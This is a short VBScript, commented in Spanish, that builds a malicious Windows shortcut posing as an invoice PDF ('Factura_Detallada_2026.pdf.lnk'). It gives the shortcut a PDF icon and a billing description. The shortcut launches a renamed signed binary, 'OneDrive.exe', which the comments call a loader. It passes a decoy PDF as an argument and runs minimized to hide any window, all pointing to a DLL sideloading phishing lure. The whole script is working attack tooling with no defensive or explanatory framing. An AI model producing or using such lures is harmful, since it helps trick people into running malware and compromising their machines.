Set oWS = CreateObject("WScript.Shell")

' Nombre del acceso directo que vera el usuario
sLinkFile = "Factura_Detallada_2026.pdf.lnk"

Set oLink = oWS.CreateShortcut(sLinkFile)

' El objetivo es el binario firmado (que debe estar en la misma carpeta)
oLink.TargetPath = "OneDrive.exe"

' Argumento para que el loader sepa que debe abrir el PDF de señuelo
oLink.Arguments = "Factura_Real.pdf"

' 7 = Minimized, evita que se vea una ventana negra al abrir
oLink.WindowStyle = 7

' Icono de PDF (imageres.dll,25 es el estandar de PDF en Windows 10/11)
oLink.IconLocation = "C:\Windows\System32\imageres.dll,25"

oLink.Description = "Documento de Facturacion Electronica"
oLink.WorkingDirectory = "."
oLink.Save
